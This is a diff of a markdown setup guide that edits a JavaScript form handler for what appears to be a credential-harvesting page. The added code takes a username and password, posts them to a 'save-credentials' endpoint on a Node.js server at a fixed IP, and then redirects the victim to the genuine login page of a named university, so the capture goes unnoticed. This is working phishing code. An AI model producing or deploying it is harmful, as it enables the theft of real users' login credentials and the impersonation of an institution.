@@ -53,37 +53,44 @@ This will:
 2. Ensure the form’s `<form>` tag or JavaScript code points to the Node.js backend. **Update the IP address in the JavaScript `submitForm` function to match the IIS server's IP.** For example:
    ```javascript
    async function submitForm(event) {
-       event.preventDefault();
+    event.preventDefault();
 
-       const username = document.getElementById('username').value;
-       const password = document.getElementById('password').value;
+    // Get the username and password values from the form
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
-       if (!username || !password) {
-           alert("Please enter both username and password.");
-           return;
-       }
+    if (!username || !password) {
+        alert("Please enter both username and password.");
+        return;
+    }
 
-       try {
-           const response = await fetch('http://<IIS_SERVER_IP>:4000/save-credentials', {
-               method: 'POST',
-               headers: {
-                   'Content-Type': 'application/json',
-               },
-               body: JSON.stringify({ username, password }),
-           });
+    try {
+        // Send data to the Node.js server
+        const response = await fetch('http://192.168.124.1:4000/save-credentials', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ username, password }),
+        });
 
-           if (response.ok) {
-               const result = await response.json();
-               alert(result.message || 'Credentials saved successfully.');
-           } else {
-               const error = await response.json();
-               alert(error.message || 'An error occurred.');
-           }
-       } catch (err) {
-           console.error('Error connecting to the server:', err);
-           alert('Failed to connect to the server.');
-       }
-   }
+        // Handle server response
+        if (response.ok) {
+            const result = await response.json();
+            alert(result.message || 'Credentials saved successfully.');
+
+            // Redirect to the specified URL on success
+            window.location.href = 'https://acceso.javeriana.edu.co/menu/login3_v2.html?bmctx=A04E6915505F18E099136E72C9264584664C73087CD21469F3540EEF40735E67&password=secure_string&contextType=external&username=string&challenge_url=https%3A%2F%2Facceso.javeriana.edu.co%2Fmenu%2Flogin3_v2.html&request_id=-1917398409814472959&authn_try_count=0&locale=es_419&resource_url=http%253A%252F%252Fintranet.javeriana.edu.co%252Finicio';
+        } else {
+            const error = await response.json();
+            alert(error.message || 'An error occurred.');
+        }
+    } catch (err) {
+        console.error('Error connecting to the server:', err);
+        alert('Failed to connect to the server.');
+    }
+}
+
    ```
    Replace `<IIS_SERVER_IP>` with the actual IP address of the IIS server (e.g., `192.168.124.1`).
 
